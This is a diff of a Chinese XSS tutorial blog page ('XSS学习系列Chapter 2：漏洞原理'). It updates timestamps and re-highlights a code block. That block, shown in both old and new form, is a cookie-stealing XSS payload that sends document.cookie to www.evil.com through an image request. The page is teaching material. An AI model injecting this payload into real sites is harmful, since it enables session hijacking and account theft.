@@ -23,7 +23,7 @@
 <meta property="og:site_name" content="IT技术学习分享自留地">
 <meta property="og:description" content="一、概述0x00 什么是XSS漏洞？ XSS，即跨站脚本（Cross Site Script），是由于网站对用户输入过滤不严而造成的漏洞。攻击者可以通过提交恶意JS代码，把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码导致被攻击。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-03-21T05:44:09.703Z">
+<meta property="og:updated_time" content="2019-03-22T03:47:35.074Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS学习系列Chapter 2：漏洞原理">
 <meta name="twitter:description" content="一、概述0x00 什么是XSS漏洞？ XSS，即跨站脚本（Cross Site Script），是由于网站对用户输入过滤不严而造成的漏洞。攻击者可以通过提交恶意JS代码，把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码导致被攻击。">
@@ -346,7 +346,7 @@
 <li><code>escape()</code>函数用于构建合理的URL（对给定的URL进行URL编码使其符合规定）。</li>
 </ul>
 <p><strong>2.漏洞利用脚本：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img = document.createElement(&apos;img&apos;); </span><br><span class="line">img.src=&apos;http://www.evil.com/no.php?&apos;+escape(document.cookie);</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>); </span><br><span class="line">img.src=<span class="string">'http://www.evil.com/no.php?'</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
 <p>脚本原理：创建一个用于请求图片的<code>&lt;img&gt;</code>标签，该标签会向<code>src</code>属性指定的URL发起一次GET请求，我们让其<code>src</code>向我们的服务器发起一次GET并且让其携带Cookie作为参数。若脚本被加载并执行成功，我们通过查看我们的服务器<code>access.log</code>日志就能看到Cookie。也可以编写一个页面来接收Payload发送的Cookie参数。</p>
 <p><strong>3.其他漏洞利用代码：</strong></p>
 <ul>
@@ -381,7 +381,7 @@
         <p><span>本文标题:</span><a href="/2019/03/11/0x01-XSS学习系列之漏洞原理/">XSS学习系列Chapter 2：漏洞原理</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">sh4douu</a></p>
         <p><span>发布时间:</span>2019-03-11, 09:42:09</p>
-        <p><span>最后更新:</span>2019-03-21, 13:44:09</p>
+        <p><span>最后更新:</span>2019-03-22, 11:47:35</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/03/11/0x01-XSS学习系列之漏洞原理/" title="XSS学习系列Chapter 2：漏洞原理">https://sakuxa.com/2019/03/11/0x01-XSS学习系列之漏洞原理/</a>
             <span class="copy-path" data-clipboard-text="原文: https://sakuxa.com/2019/03/11/0x01-XSS学习系列之漏洞原理/　　作者: sh4douu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
